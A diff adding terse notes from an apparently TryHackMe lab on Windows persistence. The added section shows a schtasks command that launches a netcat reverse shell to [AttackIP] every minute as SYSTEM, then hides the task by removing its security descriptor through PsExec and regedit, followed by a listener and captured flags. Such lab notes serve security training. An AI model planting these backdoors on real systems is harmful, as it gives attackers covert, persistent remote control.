@@ -157,5 +157,25 @@ sc.exe start THMservice3
 -grab flag
 *THM{IN_PLAIN_SIGHT}
 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Abusing scheduled Tasks
+-Windows task scheduler - granular control of when task start
+-configure activation at specific hours and dates
+-create a task that runs a reverse shell every minute
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe [AttackIP] [AttackPort]" /ru SYSTEM
+-/sc and /mo: run every minute, /ru: run with system privileges
+-query task 
+schtasks /query /tn thm-taskbackdoor
+-mask task inivisible
+-Security Descriptor: ties scheduled tasks to users
+c:\tools\pstools\PsExec64.exe -s -i regedit
+-try query again should return an error 
+-start listener on attack machine
+nc -lvp [AttackPort]
+-grab flag
+*THM{JUST_A_MATTER_OF_TIME}
+-open regedit go to: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
+
 
 
